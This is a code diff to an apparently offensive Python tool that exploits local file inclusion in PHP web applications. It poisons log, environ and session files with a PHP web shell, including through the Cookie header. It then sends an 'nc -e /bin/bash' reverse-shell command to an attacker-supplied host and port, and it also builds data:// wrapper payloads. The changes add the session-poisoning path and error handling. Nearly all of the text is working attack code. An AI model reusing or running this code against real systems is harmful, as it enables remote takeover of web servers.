@@ -18,10 +18,10 @@ class Shell_conncet:
     def Connect_SSh_Shell(self,**kwargs):
         if self.args.readuser:
             with open(self.args.readuser,'r') as username:
-                self.args.user = username.read().replace('/n','')
+                self.args.user = username.read().replace('\n','')
         if self.args.readpass:
            with open(self.args.readpass,'r') as password:
-                self.args.password = password.read().replace('/n','') 
+                self.args.password = password.read().replace('\n','') 
         if self.args.Vulnurl:
             try:
               domain = str(re.search(r'https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Vulnurl)).split()
@@ -34,7 +34,7 @@ class Shell_conncet:
             output   = str(DisCover.communicate()).split()
             self.ip_re = (output[2]).replace("(",'').replace(')','')
         if "proc/self/environ" in self.url\
-        or 'apache2/access.log' in self.url :                                                                                                          
+        or 'apache2/access.log' in self.url or 'sessions' in self.url :                                                                                                          
             self.paylaodPHP = "<?php system($_GET['cmd']); ?>"  
             request = mechanize.Browser()
             request.set_handle_robots(False)
@@ -70,6 +70,37 @@ class Shell_conncet:
                          exit()
                 except KeyboardInterrupt:
                      exit()
+            if 'sessions' in self.url :
+                self.Cookie += "<?php system($_GET['cmd']); ?>"
+                equest.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
+                                     Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                     ('username',f'{self.args.user}'),
+                                     ('password',f'{self.args.password}'),
+                                     ('Cookie',str(self.Cookie).replace('\n',''))]
+                        
+                path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/netcat.py'
+                run    = 'gnome-terminal  -- '+path
+                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE) 
+                if not self.args.port:
+                    command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '  
+                else:
+                     command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +" " + str(self.args.port)   
+                try:
+                    first_req = request.open(self.url).read()  
+                    time.sleep(4) 
+                    self.Get_Oregnal_URL = request.open(command).read()
+                    exit()
+                except Exception  as e :
+                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
+                         print("[*] Error : ",e )
+                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
+                         print("[*] Follow url Format ")
+                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
+                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
+                         exit()
+                except KeyboardInterrupt:
+                     exit()           
+  
         elif  'php.ini' in self.url or 'apache2' in  self.url :
             with open('./Package/shell/php.txt', 'r') as paylaodPHPRead:
                 paylaodPHPRead = paylaodPHPRead.read().replace(" $ip = 'IP'", f" $ip = '{self.args.shell}'")\
@@ -89,8 +120,13 @@ class Shell_conncet:
                                     ('username',f'{self.args.user}'),
                                     ('password',f'{self.args.password}')]  
                 PHPWAPPER = "data://text/plain;base64,"                   
-                self.url =  self.args.Vulnurl + PHPWAPPER +self.paylaodPHP    
-                first_req = request.open(self.url).read()
+                self.url =  self.args.Vulnurl + PHPWAPPER +self.paylaodPHP   
+                try: 
+                   first_req = request.open(self.url).read()
+                except Exception as e :
+                        print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
+                        print("[*] Error : ",e )
+                        exit()
                 time.sleep(1)
                 first_req = request.open(self.url).read()
                 exit()
